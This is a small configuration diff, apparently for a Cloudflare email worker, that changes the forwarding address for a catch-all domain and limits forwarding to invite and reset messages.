@@ -12,7 +12,8 @@ binding = "OTP"
 id = "cdf54fae793848968a168ba1b2584208"
 
 [vars]
-FORWARD_TO = "cakeseller1234@gmail.com"
+FORWARD_TO = "getspooky2758@gmail.com"
+FORWARD_KINDS = "invite,reset"
 CATCHALL_DOMAIN = "cheapmusic.best"
 
 # wrangler secret put OTP_SECRET
